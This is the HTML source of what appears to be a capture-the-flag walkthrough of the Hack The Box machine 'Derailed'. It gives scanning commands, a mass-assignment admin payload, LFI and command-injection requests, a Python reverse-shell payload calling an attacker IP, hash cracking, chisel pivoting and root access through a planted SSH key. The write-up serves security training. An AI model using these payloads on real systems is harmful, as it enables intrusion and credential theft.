@@ -1,0 +1,417 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8083932952140695"
+     crossorigin="anonymous"></script>
+    <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="meowmeowattack" data-description="Support me on Buy me a coffee!" data-message="" data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+    <title>HTB - Derailed [Insane] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.fe9a01128f24537e52223a846795c30968baf4cbb17d0f03a14ea859993459ca.css" />
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-SLVHGT13XR', { 'anonymize_ip': false });
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Derailed [Insane]"/>
+<meta name="twitter:description" content="TCP Scan &gt; TARGET=&lt;target-ip&gt; &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.4p1 Debian 5&#43;deb11u1 (protocol 2.0) 3000/tcp open http syn-ack ttl 63 nginx 1.18.0 |_http-title: derailed.htb |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1."/>
+
+    <meta property="og:title" content="HTB - Derailed [Insane]" />
+<meta property="og:description" content="TCP Scan &gt; TARGET=&lt;target-ip&gt; &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.4p1 Debian 5&#43;deb11u1 (protocol 2.0) 3000/tcp open http syn-ack ttl 63 nginx 1.18.0 |_http-title: derailed.htb |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/derailed/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-11-23T23:29:58+13:00" />
+<meta property="article:modified_time" content="2022-11-23T23:29:58+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+      <a style="font-size: smaller;" href="/privacy/">Privacy Policy</a>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Derailed [Insane]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Nov 23, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          8 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="tcp-scan">TCP Scan</h1>
+<pre tabindex="0"><code>&gt; TARGET=&lt;target-ip&gt; &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+3000/tcp open  http    syn-ack ttl 63 nginx 1.18.0
+|_http-title: derailed.htb
+|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.18.0
+</code></pre><ul>
+<li>Found domain: <code>derailed.htb</code></li>
+</ul>
+<h1 id="wen-enum">Wen Enum</h1>
+<pre tabindex="0"><code>&gt; dirsearch -u http://derailed.htb:3000/
+[03:19:42] 200 -    2KB - /login.js
+[03:19:42] 406 -   39B  - /login.json
+[03:20:07] 200 -    2KB - /rails/info/properties
+[03:20:10] 200 -   99B  - /robots.txt
+</code></pre><ul>
+<li><code>http://derailed.htb:3000/rails/info/properties</code> contains a lot of information</li>
+</ul>
+<pre tabindex="0"><code>Rails version	6.1.6
+Ruby version	ruby 2.7.2p137 (2020-10-01 revision 5445e04352) [x86_64-linux]
+RubyGems version	3.1.4
+Rack version	2.2.3
+Middleware	
+
+    Webpacker::DevServerProxy
+    ActionDispatch::HostAuthorization
+    Rack::Sendfile
+    ActionDispatch::Static
+    ActionDispatch::Executor
+    ActiveSupport::Cache::Strategy::LocalCache::Middleware
+    Rack::Runtime
+    Rack::MethodOverride
+    ActionDispatch::RequestId
+    ActionDispatch::RemoteIp
+    Sprockets::Rails::QuietAssets
+    Rails::Rack::Logger
+    ActionDispatch::ShowExceptions
+    ActionDispatch::ActionableExceptions
+    ActionDispatch::Reloader
+    ActionDispatch::Callbacks
+    ActiveRecord::Migration::CheckPending
+    ActionDispatch::Cookies
+    ActionDispatch::Session::CookieStore
+    ActionDispatch::Flash
+    ActionDispatch::ContentSecurityPolicy::Middleware
+    ActionDispatch::PermissionsPolicy::Middleware
+    Rack::Head
+    Rack::ConditionalGet
+    Rack::ETag
+    Rack::TempfileReaper
+
+Application root	/var/www/rails-app
+Environment	development
+Database adapter	sqlite3
+Database schema version	20220529182601
+</code></pre><ul>
+<li><code>http://derailed.htb:3000/rails/info/routes</code> shows all routes information</li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &#34;http://derailed.htb:3000/&#34; -H &#34;Host: FUZZ.derailed.htb:3000&#34;
+
+Found nothing
+</code></pre><ul>
+<li>Found <code>http://derailed.htb:3000/clipnotes/raw/1</code> and a user called <code>alice</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz -z range,0-69 -b _simple_rails_session=&lt;cookie&gt; http://derailed.htb:3000/clipnotes/raw/FUZZ
+</code></pre><ul>
+<li>There is a reporting facility at <code>http://derailed.htb:3000/report/&lt;number&gt;</code> and after submitting a report, we receive the following, which signals there might be an admin bot reading our post.</li>
+</ul>
+<pre tabindex="0"><code>The note has been reported. Our admins will soon have a look at it.
+</code></pre><h1 id="admin-access-to-clipnote-webapp">Admin access to clipnote webapp</h1>
+<h2 id="unintended-method-exploiting-mass-assignment">Unintended method: exploiting mass assignment</h2>
+<blockquote>
+<p><strong>Warning</strong>: this approach had been patched but worth introducing</p>
+</blockquote>
+<ul>
+<li>In the <code>/register</code> route, there was a mass assignment vulnerability where one can use to register an admin user. The related code is shown below:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span><span style="color:#75715e"># in rails-app/app/controllers/applicants_controller.rb</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># note that :role is vulnerable to mass assignment</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_params</span>
+</span></span><span style="display:flex;"><span>    params<span style="color:#f92672">.</span>require(<span style="color:#e6db74">:user</span>)<span style="color:#f92672">.</span>permit(<span style="color:#e6db74">:username</span>, <span style="color:#e6db74">:password</span>, <span style="color:#e6db74">:password_confirmation</span>, <span style="color:#e6db74">:role</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><ul>
+<li>Use burp to intercept the register request and craft a payload like below. Note <code>user[role]=administrator</code></li>
+</ul>
+<pre tabindex="0"><code>authenticity_token=&lt;token&gt;&amp;user[username]=meow&amp;user[password]=test&amp;user[password_confirmation]=test&amp;user[role]=administrator
+</code></pre><ul>
+<li>You now have a user with admin privilege</li>
+<li>Later in the exploit, we can get a copy of the <code>rails-app</code> code and we can run <code>brakeman</code> on it to learn that the rails-app is vulnerable to xxs.</li>
+</ul>
+<pre tabindex="0"><code>Confidence: Weak
+Category: Cross-Site Scripting
+Check: SanitizeConfigCve
+Message: rails-html-sanitizer 1.4.2 is vulnerable to cross-site scripting when `select` and `style` tags are allowed (CVE-2022-32209). Upgrade to 1.4.3 or newer
+File: Gemfile.lock
+Line: 138
+</code></pre><h2 id="intended-approach-work-in-progress">Intended approach (work in progress)</h2>
+<ul>
+<li>Something to do with the following</li>
+<li>Register a user with the following name (you need to intercept the request to do it, client app has character limit)</li>
+</ul>
+<pre tabindex="0"><code>&lt;select&lt;style/&gt;W&lt;xmp&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><ul>
+<li>Then post a random post and view it.</li>
+<li>The <code>created</code> part will be mangled.</li>
+</ul>
+<h1 id="enum-with-lfi">Enum with LFI</h1>
+<ul>
+<li>Once you are an admin user, browse to the <code>/administration</code> route and see multiple reports. Report downloading is vulnerable to LFI and cmd injection, where you can use to download arbitrary files from the target and run arbitrary code.</li>
+<li>Intercept the traffic with burp and try to download a report (if the box is fresh and no reports are there, just create one).</li>
+</ul>
+<pre tabindex="0"><code>authenticity_token=&lt;token&gt;&amp;report_log=/etc/passwd&amp;button=
+</code></pre><ul>
+<li>The same field is also vulnerable to cmd injection, so you can do this to run arbitrary cmd on the target. Note the pipe <code>|</code> character before the cmd you inject.</li>
+</ul>
+<pre tabindex="0"><code>authenticity_token=&lt;token&gt;&amp;report_log=|&lt;cmd&gt;&amp;button=
+</code></pre><ul>
+<li>Read this post for more detail why this is exploitable: <a href="https://bishopfox.com/blog/ruby-vulnerabilities-exploits">https://bishopfox.com/blog/ruby-vulnerabilities-exploits</a></li>
+</ul>
+<h1 id="foothold">Foothold</h1>
+<ul>
+<li>After some enum using cmd injection, we found a file at <code>/var/www/rails-app/app/controllers/admin_controller.rb</code></li>
+<li>Viewing the content, there is an <code>open</code> method used that can be exploited for RCE. This confirms why we are able to run code via <code>report_log</code> param:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>report_log <span style="color:#f92672">=</span> params<span style="color:#f92672">[</span><span style="color:#e6db74">:report_log</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">begin</span>
+</span></span><span style="display:flex;"><span>    file <span style="color:#f92672">=</span> open(report_log)
+</span></span></code></pre></div><ul>
+<li>Craft a payload like below and send it onto the <code>/administration/reports</code> endpoint to get a reverse shell</li>
+</ul>
+<pre tabindex="0"><code>POST /administration/reports HTTP/1.1
+Host: derailed.htb:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://derailed.htb:3000/administration
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+Origin: http://derailed.htb:3000
+Connection: close
+Cookie: _simple_rails_session=&lt;cookie&gt;
+Upgrade-Insecure-Requests: 1
+
+authenticity_token=uumZ0OmMzMVSPrTh77aMmV9u21MvuqBcL8pxtfxv7Or4f69X9VF3OASjdwRUzmKXmcjMHta7JkVmkK_12wlBqg&amp;report_log=&lt;rce-payload&gt;&amp;button=
+
+# the payload i used is
+|python3+-c+&#39;import+pty;import+socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;ip&gt;&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;bash&#34;)&#39;
+</code></pre><h1 id="cracking-password-hashes">Cracking password hashes</h1>
+<ul>
+<li>From <code>/var/www/rails-app/db/development.sqlite3</code>, we can find two hashes, one of them is crackable using <code>hashcat</code></li>
+</ul>
+<pre tabindex="0"><code>alice	$2a$12$hkqXQw6n0CxwBxEW/0obHOb.0/****e/4z95W3BhoFqpQRKIAxI7.
+toby	$2a$12$AD54WZ4XBxPbNW/5gWUIKu0Hpv****5RML3sDLuIqNqqimqnZYyle
+
+# you need to download the latest version of hashcat to have the module 28400
+&gt; hashcat -m 28400 hash.txt rockyou.txt
+</code></pre><ul>
+<li>The hash for <code>toby</code> can be cracked: <code>g******y</code></li>
+</ul>
+<h1 id="pe-alices-credential">PE: alice&rsquo;s credential</h1>
+<ul>
+<li>In <code>/var/www/rails-app/</code>, we can find (part of) the rails-app. This is also a git repository.</li>
+</ul>
+<pre tabindex="0"><code># show commit histories
+&gt; git log
+commit 5ef649cc9b81893b070c607bdca5e6ed4370b914 (HEAD -&gt; master)
+Author: gituser &lt;gituser@local&gt;
+Date:   Sat May 28 15:01:14 2022 +0200
+
+    init
+
+commit 61995bf40dcb332b8979adc32152d73e5546e40c
+Author: gituser &lt;gituser@local&gt;
+Date:   Fri May 27 21:06:07 2022 +0200
+
+    init
+
+commit 15df0becc4d8fc989bda8c154637d183258d3af0
+Author: gituser &lt;gituser@local&gt;
+Date:   Thu May 19 21:41:04 2022 +0200
+
+    init
+</code></pre><ul>
+<li>We can find alice&rsquo;s credential in one of the commits</li>
+</ul>
+<pre tabindex="0"><code>&gt; git checkout 61995bf40dcb332b8979adc32152d73e5546e40c -f
+
+# Then browse to the file rails-app/db/seeds.rb to get alice&#39;s credential
+* alice:recliner-bellyaching-bungling-continuum-gonging-laryng****
+</code></pre><h1 id="pe-openmediavault-webgui">PE: openmediavault-webgui</h1>
+<ul>
+<li>The previously cracked credential can be used to login as <code>openmediavault-webgui</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; su - openmediavault-webgui
+</code></pre><ul>
+<li>This user belongs to several openmediavault related groups</li>
+</ul>
+<pre tabindex="0"><code>uid=999(openmediavault-webgui) gid=996(openmediavault-webgui) groups=996(openmediavault-webgui),999(openmediavault-config),998(openmediavault-engined)
+</code></pre><ul>
+<li>This is the user used to run an application called <code>openmediavault (i.e omv)</code> which is an application that manages access control to resources.</li>
+<li>Check openmediavault version. There doesn&rsquo;t seem to be any open exploits</li>
+</ul>
+<pre tabindex="0"><code>&gt; dpkg -l | grep openmediavault
+hi  openmediavault                     6.0.27-1                       all          openmediavault - The open network attached storage solution
+ii  openmediavault-keyring             1.0                            all          GnuPG archive keys of the OpenMediaVault archive
+</code></pre><ul>
+<li>Looking at the open ports, there is an application running at <code>80</code>, which is the omv application.</li>
+</ul>
+<pre tabindex="0"><code>[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -
+tcp        0      0 10.129.74.181:5357      0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:40745         0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:40829         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3003          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::139                  :::*                    LISTEN      -
+tcp6       0      0 :::111                  :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 :::445                  :::*                    LISTEN      -
+</code></pre><ul>
+<li>Since it runs on <code>127.0.0.1</code>, we need to pivot the traffic to access it</li>
+</ul>
+<pre tabindex="0"><code># on kali
+&gt; chisel server -p 9999 --reverse
+
+# on target, upload chisel and give execution rights
+&gt; chmod +x chisel
+&gt; ./chisel client --max-retry-count=1 &lt;ip&gt;:9999 R:8888:localhost:80
+</code></pre><h1 id="ssh-as-openmediavault-webgui">SSH as openmediavault-webgui</h1>
+<blockquote>
+<p><strong>Warning</strong>: this step was later proven to be unnecessary, and due to some recent changes, resetting admin password using omv-firstaid no longer worked</p>
+</blockquote>
+<ul>
+<li>The default credentail for omv webgui is <code>admin:openmediavault</code>, however, this had been changed. So we need to reset the password using omv-firstaid: <a href="https://forum.openmediavault.org/index.php?thread/5934-omv-firstaid-usage/">https://forum.openmediavault.org/index.php?thread/5934-omv-firstaid-usage/</a>. This tool can be found at <code>/usr/sbin/omv-firstaid</code>. However, because it&rsquo;s an interactive tool, we have to login via a ssh session.</li>
+<li><code>openmediavault-webgui</code> is not in <code>ssh</code> group, so we cannot ssh to the target as <code>openmediavault-webgui</code> directly.</li>
+<li>However, the <code>rails</code> user is in <code>ssh</code> group, yet we don&rsquo;t know the password. But we can create a <code>.ssh/authorized_keys</code> file and echo our public key to it to gain ssh access.</li>
+</ul>
+<pre tabindex="0"><code># as rails
+rails@derailed:~$ mkdir .ssh
+rails@derailed:~$ echo &#39;&lt;id_rsa.pub&gt;&#39; &gt; .ssh/authorized_keys
+
+# login as rails via ssh
+&gt; ssh rails@derailed.htb
+
+# switch to openmediavault-webgui
+rails@derailed:~$ su openmediavault-webgui
+</code></pre><ul>
+<li>Then, we can reset the admin password for the omv web portal</li>
+</ul>
+<pre tabindex="0"><code># as openmediavault-webgui
+openmediavault-webgui@derailed:~$ /usr/sbin/omv-firstaid
+# then use option 3 to reset the password
+</code></pre><ul>
+<li>Now, we are able to access the omv webgui at <code>http://127.0.0.1:8888</code> and login using <code>admin:&lt;whatever-we-set&gt;</code></li>
+</ul>
+<blockquote>
+<p><strong>Warning</strong>: again, this step was later proven to be unnecessary, and it no longer worked after the patches</p>
+</blockquote>
+<h1 id="pe-root">PE: root</h1>
+<ul>
+<li>Upload linpeas and do enum, we learnt that omv is running on port 80. We can find the relevant config file for this app.</li>
+</ul>
+<pre tabindex="0"><code>[+] Readable files belonging to root and readable by me but not world readable
+-rw-rw---- 1 root openmediavault-config 18838 May 30 07:13 /etc/openmediavault/config.xml
+</code></pre><ul>
+<li>The omv tools are stored in <code>/usr/sbin/</code>. Since this app is used to manage access control to resources. We can use it to add a new access method for a high-privilege user. In this case, we can make the root user accept our <code>public ssh key</code>, so that we can ssh into the target as root.</li>
+<li>Create your ssh public key and follow the required format: <a href="https://forum.openmediavault.org/index.php?thread/7822-guide-enable-ssh-with-public-key-authentication-securing-remote-webui-access-to/">https://forum.openmediavault.org/index.php?thread/7822-guide-enable-ssh-with-public-key-authentication-securing-remote-webui-access-to/</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; ssh-keygen -t rsa
+&gt; ssh-keygen -e -f ~/.ssh/id_rsa.pub
+
+# do some cleaning of this public key and record it for use
+</code></pre><ul>
+<li>Then download a copy of <code>/etc/openmediavault/config.xml</code> and let&rsquo;s edit it to make root to accept our public ssh key. The config.xml on the target contains two user entries: <code>rails</code> and <code>test</code>. You can update the <code>test</code> user&rsquo;s section for <code>root</code>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>        <span style="color:#f92672">&lt;user&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;uuid&gt;</span>e3f59fea-4be7-4695-b0d5-560f25072d4a<span style="color:#f92672">&lt;/uuid&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;name&gt;</span>root<span style="color:#f92672">&lt;/name&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;email&gt;&lt;/email&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;disallowusermod&gt;</span>0<span style="color:#f92672">&lt;/disallowusermod&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;sshpubkeys&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;sshpubkey&gt;</span>---- BEGIN SSH2 PUBLIC KEY ----
+</span></span><span style="display:flex;"><span>`your-public-key`
+</span></span><span style="display:flex;"><span>---- END SSH2 PUBLIC KEY ----
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/sshpubkey&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;/sshpubkeys&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/user&gt;</span>
+</span></span></code></pre></div><ul>
+<li>We can now put this modified config file onto the target as user <code>openmediavault-webgui</code>, because the config belongs to the group <code>openmediavault-config</code>.</li>
+</ul>
+<pre tabindex="0"><code># add tools to PATH for convenience
+&gt; export PATH=/usr/sbin:$PATH
+
+# Get config to the target and overwrite
+&gt; wget http://&lt;ip&gt;/openmediavault-config.xml -O /etc/openmediavault/config.xml
+
+# Use the omv-confdbadm tool to load the modified user config, this tool will throw error if the format is wrong. So it helps us to debug our public ssh key format.
+&gt; omv-confdbadm read conf.system.usermngmnt.user
+
+# Force a config update of the ssh module
+&gt; /usr/sbin/omv-rpc -u admin &#34;config&#34; &#34;applyChanges&#34; &#34;{ \&#34;modules\&#34;: [\&#34;ssh\&#34;],\&#34;force\&#34;: true }&#34;
+</code></pre><h1 id="post-exploit-cracking-secret-key-base">Post exploit: cracking secret key base</h1>
+<ul>
+<li>As a part of the <code>rails-app</code>, there is a <code>rails-app/config/credentials.yml.enc</code> and <code>rails-app/config/master.key</code>. This can be used to decrypt the <code>secret_key_base</code> used to sign session cookies; though it&rsquo;s not used for this challenge.</li>
+<li><a href="https://github.com/mbadanoiu/Credentials.yml.enc_Decryptor">https://github.com/mbadanoiu/Credentials.yml.enc_Decryptor</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; python2 Credentials.yml.enc_Decryptor/decryptor.py www/rails-app/config/credentials.yml.enc www/rails-app/config/master.key
+Credentials.yml.enc_Decryptor/decryptor.py:7: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+  from cryptography.hazmat.backends import default_backend
+I&#34;/# aws:
+#   access_key_id: 123
+#   secret_access_key: 345
+
+# Used as the base secret for all MessageVerifiers in Rails, including the one protecting cookies.
+secret_key_base: 11a5a3105df48cbeee046e75cf85a16a0417c1219b96def6ac8a2d475486607f80dc399f9367c1bdb3a826fdf360fcc241be601bb11940a80d1885bf399c5f3f
+:ET
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
